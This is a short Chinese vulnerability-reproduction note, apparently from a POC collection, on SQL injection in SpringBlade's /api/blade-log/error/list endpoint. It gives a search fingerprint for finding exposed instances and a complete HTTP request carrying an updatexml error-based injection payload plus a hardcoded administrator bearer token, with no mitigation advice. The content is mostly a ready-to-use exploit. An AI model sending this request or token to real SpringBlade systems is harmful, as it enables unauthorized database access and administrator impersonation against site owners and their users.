# SpringBlade error/list 存在SQL注入漏洞

# 一、漏洞简介
SpringBlade  /api/blade-log/error/list路径存在安全漏洞，攻击者利用该漏洞进行SQL注 入攻击

# 二、影响版本
+ SpringBlade

# 三、资产测绘
+ `<font style="color:rgb(63, 63, 63);">body="https://bladex.vip"</font>`

![1703260241729-c77ed022-a493-4621-983c-5ec64ddbde71.png](./img/BZdErnm7v21TUqLj/1703260241729-c77ed022-a493-4621-983c-5ec64ddbde71-817083.png)

# 四、漏洞复现
```java
GET /api/blade-log/error/list?updatexml(1,concat(0x7e,md5(1),0x7e),1)=1 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept: */*
Connection: Keep-Alive
Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJ1c2VyX25hbWUiOiJhZG1pbiIsInJlYWxfbmFtZSI6IueuoeeQhuWRmCIsImF1dGhvcml0aWVzIjpbImFkbWluaXN0cmF0b3IiXSwiY2xpZW50X2lkIjoic2FiZXIiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwibGljZW5zZSI6InBvd2VyZWQgYnkgYmxhZGV4IiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwic2NvcGUiOlsiYWxsIl0sIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsIm9hdXRoX2lkIjoiIiwiZGV0YWlsIjp7InR5cGUiOiJ3ZWIifSwiYWNjb3VudCI6ImFkbWluIn0.RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

![1710407897035-51869d8b-325a-46cf-84c9-d54a254547cf.png](./img/BZdErnm7v21TUqLj/1710407897035-51869d8b-325a-46cf-84c9-d54a254547cf-741901.png)



> 更新: 2024-12-13 17:10:57  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zrkt4t6xd5xn3yek>